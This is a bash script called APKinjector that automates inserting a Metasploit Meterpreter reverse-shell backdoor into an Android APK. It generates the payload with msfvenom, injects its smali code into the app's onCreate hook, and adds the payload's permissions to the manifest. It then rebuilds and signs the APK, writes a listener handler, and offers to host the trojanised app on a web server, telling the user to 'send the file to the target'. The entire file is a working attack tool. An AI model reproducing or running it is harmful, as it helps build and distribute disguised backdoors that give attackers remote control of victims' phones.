#!/bin/bash
# APKinjector
# Ghosthub (b@b@y) 
# https://iconicbabay.github.io/index/
	
MESSAGE=" 

This script was created to automatize the process of injecting an backdoor inside an android aplication

options: 

-h, --help:Welcome, this is the help screen. 
ex: bash $(basename "$0") -h

To use the script just type:
bash $(basename "$0") <app>.apk

"

case "$1" in 
	-h | --help)
		echo "$MESSAGE"
		exit 0
;;
	"")
		echo "You need to provide the file that you are going to inject the backdoor"
		echo "for example: ./APKinjector.sh something.apk"
		exit 0
;;

	-v | --version)
		#echo -n $(basename "$0")
		grep '^# Version ' $0 |  tail -1 | cut -d : -f 1 | tr -d \#
		exit 0
;;

esac

# ============================== Start of the script ===============================

printf "\033c"
echo "    _    ____  _  ___        _           _             "
echo "   / \  |  _ \| |/ (_)_ __  (_) ___  ___| |_ ___  _ __ "
echo "  / _ \ | |_) | ' /| | '_ \ | |/ _ \/ __| __/ _ \| '__|"
echo " / ___ \|  __/| . \| | | | || |  __/ (__| || (_) | |   "
echo "/_/   \_\_|   |_|\_\_|_| |_|/ |\___|\___|\__\___/|_|   "
echo "                          |__/                         "

# ============================== Check for dependencies ===============================

echo " Checking for dependencies ... "

if command -v msfvenom >/dev/null 2>&1 ; then
echo "msfvenom [OK]"
else 
echo "msfvenom [ ] Please install this software to use this script"
fi

if command -v apktool >/dev/null 2>&1 ; then
echo "apktool [OK]"
else 
echo "apktool [ ] Please install this software to use this script"
fi

if command -v jarsigner >/dev/null 2>&1 ; then
echo "jdk [OK]"
else 
echo "jdk [ ] Please install this software to use this script"
fi

echo " Done :) "
echo "****Press enter to continue or ctrl+c to stop****"
read -r DumbValue

# ============================== Start of the script ===============================



if [ -d "$1".dir ] ; then
echo "*****There's a old directory from this script. Press enter to remove that.*****"
read -r DumbValue
rm -r "$1".dir

fi
mkdir "$1".dir
cp "$1" "$1".dir
cd "$1".dir

date > report

echo 'created and moved app to a new directory' >> report

mv "$1" ./original.apk

echo "apk name changed to original.apk" >> report

# ============= Creating a backdoor ================

echo "Set the listener ip: <maybe? `ip a s|sed -ne '/127.0.0.1/!{s/^[ \t]*inet[ \t]*\([0-9.]\+\)\/.*$/\1/p}'` >"
read -r ip 
echo "Set the listener port"
read -r port
echo "Set payload type"
select payload_type in reverse_tcp reverse_http reverse_https ; do
	if [ $payload_type ]; then
		break
	else
		echo "Select the number next to the desired payload"
	fi
done

echo 'Listener->'$ip':'$port'' >> report

msfvenom -p android/meterpreter/$payload_type LHOST=$ip LPORT=$port -o meterpreter.apk

# ============= Decompile both APKs =======================

apktool d -f -o payload meterpreter.apk
sleep 10
apktool d -f -o original original.apk
sleep 10

# ============== Copy the payload files to the original ====================

mkdir original/smali/com/metasploit
mkdir original/smali/com/metasploit/stage
cp payload/smali/com/metasploit/stage/* original/smali/com/metasploit/stage

# ============================== End of the easy part ==============================


# ========================== Finding where to put the hook ======================

echo ""
echo " ==== Please select where do you want to inject the backdoor ==== "
echo ""


select bootopt in "Look_the_AndroidManifest" 'Most_likely_option ' 'All_the_possibilities' ; do


	if [ $bootopt = "Look_the_AndroidManifest" ]; then
	
		grep --color -E '^|MAIN|LAUNCHER' original/AndroidManifest.xml
	
	elif [ $bootopt = 'Most_likely_option' ];then

		for i in `seq 1 100`; do
		cat original/AndroidManifest.xml | grep -B 10 "android.intent.action.MAIN" | grep com | cut -d '"' -f$i | sed -r 's/\./\//g' >> pathmain
		done		

		number=`cat pathmain | wc -l`


		echo "Possible paths close to the main:" 
		for i in `seq 1 $number`; do
			trythis=`cat pathmain | sed -n "$i"p`
			trythis2=`echo "original/smali/$trythis.smali"`
			
			if [ -f "$trythis2" ]; then
				#if grep -q ";->onCreate(Landroid/os" $trythis2; then			
				echo $trythis2		
				boot=$trythis2
				#fi
			fi	
		done

		echo "============="
		echo "Application Boot is PROBABLY this one:"		
		echo "$boot"
		echo "============="
		rm pathmain
		echo "would you like to use that one? y or n for more options"
		read -r hook

			if [ $hook = "y" ] || [ $hook = "Y" ]; then
			pathmain=$boot
			break
			fi
	
	elif [ $bootopt = 'All_the_possibilities' ];then
		echo "Where do you want to put the hook for the backdoor?"
		select pathmain in `grep -r ";->onCreate(Landroid/os" original/smali/com/ | cut -d ':' -f 1 | grep -v metasploit` ; do 

			if [ $pathmain ]; then
			break 
			else
			echo "Invalid Option"  
			fi
		done
	
		echo "You selected: $pathmain, are you sure? y/n?"
		read -r hook

		if [ $hook = "y" ] || [ $hook = "Y" ]; then
		break
		fi
		
		else
		echo "invalid option"
	fi

done


# ========================== put the payload in the boot ======================

echo 'path for the MainActivity' >> report
echo "original/smali/$pathmain" >> report 

echo '/->onCreate(Landroid/a\' > sed1.cmd
echo 'invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V' >> sed1.cmd

mv $pathmain $pathmain.old

sed -f sed1.cmd $pathmain.old > $pathmain

rm $pathmain.old
echo "" >> report

echo "====Boot of the application=====" >> report
echo "" >> report
cat $pathmain | grep ";->onCreate(Landroid" >> report
echo "" >> report

echo "====Metasploit link======" >> report
echo "" >> report
cat $pathmain | grep metasploit >> report
echo "" >> report

# ============== Inject the necessary permissions. ===================

cat payload/AndroidManifest.xml | grep uses-permission > permissions1.cmd
cat original/AndroidManifest.xml | grep uses-permission >> permissions1.cmd
cat permissions1.cmd | awk '!x[$0]++' > permissions.cmd
rm permissions1.cmd

cat original/AndroidManifest.xml | grep -v uses-permission > original/AndroidManifest1.xml

sed -i '/xml version/r permissions.cmd' original/AndroidManifest1.xml

mv original/AndroidManifest.xml original/AndroidManifest_Original

mv original/AndroidManifest1.xml original/AndroidManifest.xml

rm original/AndroidManifest_Original

echo "" >> report
echo "===================ANDROID MANIFEST WITH NEW PERMISSIONS=============" >> report
echo "" >> report
cat original/AndroidManifest.xml >> report
echo "" >> report
echo "" >> report
echo "====================================================================" >> report
echo "" >> report
echo "" >> report

# ============== Compile the files again. ===================== 
echo "" >> report
echo 'Compile the files in original folder' >> report
apktool b original
sleep 15

# ============== Sign the new apk with a default signature =============================

echo 'Creating a default key to sign the app' >> report

keytool -genkeypair -keystore debug.keystore -alias androiddebugkey -storepass android -keypass android -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Android Debug,O=Android,C=US"

echo 'Sign the app' >> report

jarsigner -verbose -keystore debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA original/dist/original.apk androiddebugkey

# ============== Changing file name and removing useless files  ================
printf "\033c"
echo 'Changing names of the files and removing extras' >> report

cp original/dist/original.apk backdoor_"$ip"_"$port".apk

rm original.apk
rm -r original
rm -r payload
rm debug.keystore
rm permissions.cmd
rm sed1.cmd
rm meterpreter.apk

echo 'Creating the handler file ' >> report
echo 'use exploit/multi/handler' > handler.rc
echo 'set PAYLOAD android/meterpreter/'$payload_type'' >> handler.rc
echo 'set LHOST '$ip'' >> handler.rc
echo 'set LPORT '$port'' >> handler.rc
echo 'set ExitOnSession false' >> handler.rc
echo 'exploit -j' >> handler.rc

mv handler.rc handler_"$payload_type"_"$ip"_"$port".rc

echo "Ready to go! Send the file to the target!"
echo "Your file is located in: "
pwd 

echo "Would you like to transfer the backdoor to /var/www/html? y/n"
read -r server
if [ $server = 'y' ]; then 
echo "Please type a name for the backdoor"
read -r namebackdoor
sudo cp backdoor_"$ip"_"$port".apk /var/www/html/$namebackdoor.apk
echo "file transfered" 
fi

echo "would you like to start the server? y/n"
read -r startserver
if [ $startserver = 'y' ];then
	
	select serv in apache2 nginx; do 
	if [ $serv ];then 
	sudo service $serv start
	break;
	
	else
	echo "invalid option"
	fi
done
fi


echo "would you like to start the listener? y/n"
read -r listen
if [ $listen = "y" ] || [ $listen = "Y" ];
then
mkdir msfconsole 
cp handler_"$payload_type"_"$ip"_"$port".rc msfconsole/
cd msfconsole
echo 'starting the listener' >> report
msfconsole -r handler_"$payload_type"_"$ip"_"$port".rc
else
echo " Bye! " 
fi

# =============================================================================
    